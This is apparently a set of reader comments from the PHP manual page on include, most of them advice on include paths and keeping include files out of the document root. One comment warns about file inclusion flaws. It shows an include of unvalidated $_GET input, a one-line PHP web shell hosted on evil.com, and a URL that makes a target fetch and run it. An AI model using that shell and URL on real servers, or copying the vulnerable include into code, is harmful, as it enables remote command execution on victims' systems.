# Security warning




<div class="phpcode"><span class="html">
This might be useful:<br><span class="default">&lt;?php<br></span><span class="keyword">include </span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">&apos;DOCUMENT_ROOT&apos;</span><span class="keyword">].</span><span class="string">&quot;/lib/sample.lib.php&quot;</span><span class="keyword">;<br></span><span class="default">?&gt;<br></span>So you can move script anywhere in web-project tree without changes.</span>
</div>
  

#


<div class="phpcode"><span class="html">
If you want to have include files, but do not want them to be accessible directly from the client side, please, please, for the love of keyboard, do not do this:<br><br><span class="default">&lt;?php<br><br></span><span class="comment"># index.php<br></span><span class="default">define</span><span class="keyword">(</span><span class="string">&apos;what&apos;</span><span class="keyword">, </span><span class="string">&apos;ever&apos;</span><span class="keyword">);<br>include </span><span class="string">&apos;includeFile.php&apos;</span><span class="keyword">;<br><br></span><span class="comment"># includeFile.php<br><br>// check if what is defined and die if not<br><br></span><span class="default">?&gt;<br></span><br>The reason you should not do this is because there is a better option available. Move the includeFile(s) out of the document root of your project. So if the document root of your project is at &quot;/usr/share/nginx/html&quot;, keep the include files in &quot;/usr/share/nginx/src&quot;.<br><br><span class="default">&lt;?php<br><br></span><span class="comment"># index.php (in document root (/usr/share/nginx/html))<br><br></span><span class="keyword">include </span><span class="default">__DIR__ </span><span class="keyword">. </span><span class="string">&apos;/../src/includeFile.php&apos;</span><span class="keyword">;<br><br></span><span class="default">?&gt;<br></span><br>Since user can&apos;t type &apos;your.site/../src/includeFile.php&apos;, your includeFile(s) would not be accessible to the user directly.</span>
</div>
  

#


<div class="phpcode"><span class="html">
Before using php&apos;s include, require, include_once or require_once statements, you should learn more about Local File Inclusion (also known as LFI) and Remote File Inclusion (also known as RFI).<br><br>As example #3 points out, it is possible to include a php file from a remote server.<br><br>The LFI and RFI vulnerabilities occur when you use an input variable in the include statement without proper input validation.&#xA0; Suppose you have an example.php with code:<br><br><span class="default">&lt;?php<br></span><span class="comment">// Bad Code<br></span><span class="default">$path </span><span class="keyword">= </span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">&apos;path&apos;</span><span class="keyword">];<br>include </span><span class="default">$path </span><span class="keyword">. </span><span class="string">&apos;example-config-file.php&apos;</span><span class="keyword">;<br></span><span class="default">?&gt;<br></span><br>As a programmer, you might expect the user to browse to the path that you specify.<br><br>However, it opens up an RFI vulnerability.&#xA0; To exploit it as an attacker, I would first setup an evil text file with php code on my evil.com domain.<br><br>evil.txt<br><span class="default">&lt;?php </span><span class="keyword">echo </span><span class="default">shell_exec</span><span class="keyword">(</span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">&apos;command&apos;</span><span class="keyword">]);</span><span class="default">?&gt;<br></span><br>It is a text file so it would not be processed on my server but on the target/victim server.&#xA0; I would browse to:<br>h t t p : / / w w w .example.com/example.php?command=whoami&amp; path= h t t p : / / w w w .evil.com/evil.txt%00<br><br>The example.php would download my evil.txt and process the operating system command that I passed in as the command variable.&#xA0; In this case, it is whoami.&#xA0; I ended the path variable with a %00, which is the null character.&#xA0; The original include statement in the example.php would ignore the rest of the line.&#xA0; It should tell me who the web server is running as.<br><br>Please use proper input validation if you use variables in an include statement.</span>
</div>
  

#


<div class="phpcode"><span class="html">
I cannot emphasize enough knowing the active working directory. Find it by: echo getcwd();<br>Remember that if file A includes file B, and B includes file C; the include path in B should take into account that A, not B, is the active working directory.</span>
</div>
  

#


<div class="phpcode"><span class="html">
As a rule of thumb, never include files using relative paths. To do this efficiently, you can define constants as follows:<br><br>----<br><span class="default">&lt;?php </span><span class="comment">// prepend.php - autoprepended at the top of your tree<br></span><span class="default">define</span><span class="keyword">(</span><span class="string">&apos;MAINDIR&apos;</span><span class="keyword">,</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">) . </span><span class="string">&apos;/&apos;</span><span class="keyword">);<br></span><span class="default">define</span><span class="keyword">(</span><span class="string">&apos;DL_DIR&apos;</span><span class="keyword">,</span><span class="default">MAINDIR </span><span class="keyword">. </span><span class="string">&apos;downloads/&apos;</span><span class="keyword">);<br></span><span class="default">define</span><span class="keyword">(</span><span class="string">&apos;LIB_DIR&apos;</span><span class="keyword">,</span><span class="default">MAINDIR </span><span class="keyword">. </span><span class="string">&apos;lib/&apos;</span><span class="keyword">);<br></span><span class="default">?&gt;<br></span>----<br><br>and so on. This way, the files in your framework will only have to issue statements such as this:<br><br><span class="default">&lt;?php<br></span><span class="keyword">require_once(</span><span class="default">LIB_DIR </span><span class="keyword">. </span><span class="string">&apos;excel_functions.php&apos;</span><span class="keyword">);<br></span><span class="default">?&gt;<br></span><br>This also frees you from having to check the include path each time you do an include.<br><br>If you&apos;re running scripts from below your main web directory, put a prepend.php file in each subdirectory:<br><br>--<br><span class="default">&lt;?php<br></span><span class="keyword">include(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">)) . </span><span class="string">&apos;/prepend.php&apos;</span><span class="keyword">);<br></span><span class="default">?&gt;<br></span>--<br><br>This way, the prepend.php at the top always gets executed and you&apos;ll have no path handling headaches. Just remember to set the auto_prepend_file directive on your .htaccess files for each subdirectory where you have web-accessible scripts.</span>
</div>
  

#

[Official documentation page](https://www.php.net/manual/en/function.include.php)

**[To root](/)**